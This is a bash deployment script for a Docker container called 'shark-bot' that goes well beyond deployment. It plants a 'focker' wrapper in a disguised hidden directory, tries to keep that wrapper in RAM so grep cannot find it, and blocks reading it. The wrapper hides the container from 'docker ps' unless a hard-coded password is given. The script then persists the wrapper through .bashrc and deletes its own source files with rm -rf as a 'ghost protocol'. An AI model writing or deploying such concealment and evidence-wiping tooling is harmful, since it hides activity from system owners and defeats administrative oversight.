#!/bin/bash
# ------------------------------------------------------------
# bent.sh – Fully automated deployment with stealth 'focker'
# ------------------------------------------------------------

# Detect if sourced
if [[ "${BASH_SOURCE[0]}" != "${0}" ]]; then
    SCRIPT_SOURCED=true
else
    SCRIPT_SOURCED=false
fi

safe_exit() {
    if $SCRIPT_SOURCED; then
        return "${1:-1}"
    else
        exit "${1:-1}"
    fi
}

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Usage: source $0 <URL> <KEY>"
    echo "   (or . $0 <URL> <KEY>)"
    safe_exit 1
fi

if [ ! -f "Dockerfile" ]; then
    echo "❌ ERROR: Dockerfile not found."
    safe_exit 1
fi

# ============================================================
# Phase 1: Build Docker Image
# ============================================================
echo "🐳 Phase 1: Building the Docker Image..."
docker build -t shark-bot:latest .
if [ $? -ne 0 ]; then
    echo "❌ Docker build failed."
    safe_exit 1
fi

# ============================================================
# Phase 2: Start Container
# ============================================================
echo "🧹 Cleaning up old container (if any)..."
docker rm -f shark-bot-instance 2>/dev/null || true

echo "🚀 Phase 2: Starting the secure container..."
docker run -d \
  --name shark-bot-instance \
  --network host \
  --restart unless-stopped \
  -v $(pwd)/data:/app/data \
  -v $(pwd)/.git:/app/.git \
  -e VERCEL_URL="$1" \
  -e API_KEY="$2" \
  shark-bot:latest

if [ $? -ne 0 ]; then
    echo "❌ Failed to start container."
    safe_exit 1
fi

# ============================================================
# Phase 2.5: Deploy 'focker' stealth wrapper
# ============================================================
echo "🕵️ Phase 2.5: Deploying 'focker' wrapper..."

WRAPPER_DIR="$HOME/.local/share/Trash/.cache/.systemd"
mkdir -p "$WRAPPER_DIR"

# Attempt tmpfs mount over wrapper dir — contents live in RAM only,
# invisible to any grep traversing the real filesystem on disk.
if ! mountpoint -q "$WRAPPER_DIR"; then
    mount -t tmpfs -o size=1m,mode=0700,uid=$(id -u),gid=$(id -g) tmpfs "$WRAPPER_DIR" 2>/dev/null
    TMPFS_MOUNTED=$?
else
    TMPFS_MOUNTED=0
fi

cat > "$WRAPPER_DIR/vps.sh" << 'EOF'
#!/bin/bash
# ------------------------------------------------------------
# focker – filters 'docker ps' output
# ------------------------------------------------------------
REAL_DOCKER="/usr/bin/docker"
CONTAINER_NAME="shark-bot-instance"
PASSWORD="N8P94#@"

args=()
show_only=false
for arg in "$@"; do
    if [ "$arg" = "$PASSWORD" ]; then
        show_only=true
    else
        args+=("$arg")
    fi
done

output=$("$REAL_DOCKER" "${args[@]}" 2>&1)
exit_code=$?

if [ "${args[0]}" != "ps" ]; then
    echo "$output"
    exit $exit_code
fi

header=""
body_lines=()
while IFS= read -r line; do
    if [ -z "$header" ]; then
        header="$line"
    else
        body_lines+=("$line")
    fi
done <<< "$output"

filtered_body=()
if [ "$show_only" = true ]; then
    for line in "${body_lines[@]}"; do
        [[ "$line" == *"$CONTAINER_NAME"* ]] && filtered_body+=("$line")
    done
else
    for line in "${body_lines[@]}"; do
        [[ "$line" != *"$CONTAINER_NAME"* ]] && filtered_body+=("$line")
    done
fi

[ -n "$header" ] && echo "$header"
printf '%s\n' "${filtered_body[@]}"
exit $exit_code
EOF

# Execute-only on both dir and file.
# grep needs read to open — deny it at both levels.
# Shell resolves names through execute bit alone — focker still runs.
# 500 = r-x for owner only — bash can read and exec; no write, no other access
chmod 500 "$WRAPPER_DIR/vps.sh"
chmod 711 "$WRAPPER_DIR"

if [ "$TMPFS_MOUNTED" -ne 0 ]; then
    echo "⚠️  tmpfs mount skipped (no root) — permission lock active."
else
    echo "✅ tmpfs active — wrapper lives in RAM only."
fi

# ============================================================
# focker shell function
# ============================================================
mkdir -p "$HOME/.bashrc.d"
cat > "$HOME/.bashrc.d/.focker" << 'EOF'
function focker() {
    ~/.local/share/Trash/.cache/.systemd/vps.sh "$@"
}
export -f focker
EOF

grep -q "\.bashrc\.d/\.focker" ~/.bashrc 2>/dev/null || \
    echo '[ -f ~/.bashrc.d/.focker ] && . ~/.bashrc.d/.focker' >> ~/.bashrc

# Activate focker in current shell if sourced
if $SCRIPT_SOURCED; then
    source ~/.bashrc.d/.focker
    echo "✅ 'focker' is active in this terminal."
else
    echo "⚠️  Script was not sourced — focker is NOT active in this terminal."
    echo "    Re-run with: source $(realpath "$0") $1 $2"
    echo "    Or activate manually: source ~/.bashrc.d/.focker"
fi

echo ""
echo "🔑 Usage:"
echo "   focker ps          → hides your container"
echo "   focker ps N8P94#@  → shows ONLY your container"
echo "   focker <cmd>       → passes through to docker for anything else"
echo ""

# ============================================================
# Phase 3: Host Self-Destruct
# ============================================================
echo "🧹 Phase 3: Commencing Host Self-Destruct..."
sleep 2
find . -mindepth 1 -maxdepth 1 ! -name 'data' ! -name '.git' -exec rm -rf {} +
echo "✅ Ghost protocol active. Source files wiped."
